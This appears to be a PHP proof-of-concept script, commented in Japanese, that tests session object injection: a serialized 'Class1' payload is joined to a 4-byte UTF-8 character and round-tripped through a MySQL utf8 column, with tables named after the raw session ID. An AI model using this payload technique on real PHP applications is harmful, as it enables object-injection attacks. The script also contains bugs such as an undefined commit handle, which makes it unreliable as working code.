<?php
// インジェクションするクラス（攻撃対象の既存クラス）
class Class1 {
  private $private = 'prv';
  function __destruct() {
    echo "Class1::__destruct()\n";
  }
}

session_start();
$id = 'ockeghem'; // ログインユーザ名
// $browser はUser-Agentであり外部からコントロールできる
$browser = 'Mozilla/5.0';
$utf4byte = "𠮷";
$injection = '_aa|O:6:"Class1":1:{s:15:"%00Class1%00private";s:3:"prv";}';

$ua = $_SERVER['HTTP_USER_AGENT'];
echo $ua . "\n<br/>";

//$_SESSION['_default']['id'] = $id;
//$_SESSION['_default']['browser'] = $browser;
//$_SESSION['_test']['browser'] = new Class1;;
$_SESSION['_inject']['browser'] = $injection . $utf4byte;
//$_SESSION['_default']['browser'] = $ua;

$mysqli = new mysqli('127.0.0.1', 'phptest', 'phptest', 'phptest');
if ($mysqli->connect_error) {
    echo $mysqli->connect_error;
    exit();
} else {
    $mysqli->set_charset("utf8");
}

$mysqli->begin_transaction(MYSQLI_TRANS_START_READ_WRITE);

$id = session_id();
//if (!$mysqli->query("DROP TABLE IF EXISTS $id") || !$mysqli->query("CREATE TABLE $id(name char(40), value char(255))")) {
//    echo "Table creation failed: (" . $mysqli->errno . ") " . $mysqli->error;
//}
$mysqli->query("CREATE TABLE IF NOT EXISTS $id(name char(40), value char(255))");

/* select value */
if (!($stmt = $mysqli->prepare("SELECT value FROM $id"))) {
    echo "Prepare failed: (" . $mysqli->errno . ") " . $mysqli->error;
}

if (!$stmt->execute()) {
    echo "Execute failed: (" . $stmt->errno . ") " . $stmt->error;
}

$stmt->bind_result($value);
while ($stmt->fetch()) {
  $mysqldata = $value;
  $values .= "<br>value=$value<br>"; 
}

echo "first: " . $mysqldata . "<br/>";


// 行数の取得
$stmt->store_result(); // これ忘れるとnum_rowsは0
$num = $stmt->num_rows;
$rows .= "rows=" . $num . "<br>";
echo $rows;
$stmt->close();





/*    insert value    */
if($num == 0){
  /* Prepared statement, stage 1: prepare */
    if (!($stmt = $mysqli->prepare("INSERT INTO $id VALUES (?, ?)"))) {
      echo "Prepare failed: (" . $mysqli->errno . ") " . $mysqli->error;
    }
  
  if (!$stmt->bind_param('ss', $name, $browser)) {
    echo "Binding parameters failed: (" . $stmt->errno . ") " . $stmt->error;
  }
  
  $name = "browser";
  $browser = $_SESSION['_default']['browser'];
  
  if (!$stmt->execute()) {
    echo "Execute failed: (" . $stmt->errno . ") " . $stmt->error;
  }
  $stmt->close();
}





/*    select value    */
if (!($stmt = $mysqli->prepare("SELECT value FROM $id"))) {
    echo "Prepare failed: (" . $mysqli->errno . ") " . $mysqli->error;
}

if (!$stmt->execute()) {
    echo "Execute failed: (" . $stmt->errno . ") " . $stmt->error;
}

$stmt->bind_result($value);
while ($stmt->fetch()) {
  $mysqldata = $value;
  $values .= "<br>value=$value<br>"; 
}

// 行数の取得
$stmt->store_result(); // これ忘れるとnum_rowsは0
$rows .= "rows=" . $stmt->num_rows . "<br>";

$stmt->close();

// transaction commit
mysqli_commit($link);

// DB接続を閉じる
$mysqli->close();




echo '<div>str_replace<br>';
echo str_replace("\0", '%00', session_encode()) . "\n";
echo '</div>';
echo '<br><br>';
echo '<div>var_dump<br>';
echo var_dump($_SESSION);
echo '</div>';

echo "<br/>";
echo $browser . "<br/>";
echo $mysqldata;
echo $rows;



$_SESSION['_inject']['browser'] = $mysqldata;
echo '<div>str_replace2<br>';
echo str_replace("\0", '%00', session_encode()) . "\n";
echo '</div>';
echo '<br><br>';
echo '<div>var_dump2<br>';
echo var_dump($_SESSION);
echo '</div>';

session_destroy();


/*
if (!isset($_SESSION['count'])) {
  $_SESSION['count'] = 0;
} else {
  $_SESSION['count']++;
}
echo $_SESSION['count'];

*/
?>
<br>
<a href=phptest2.php>here</a>
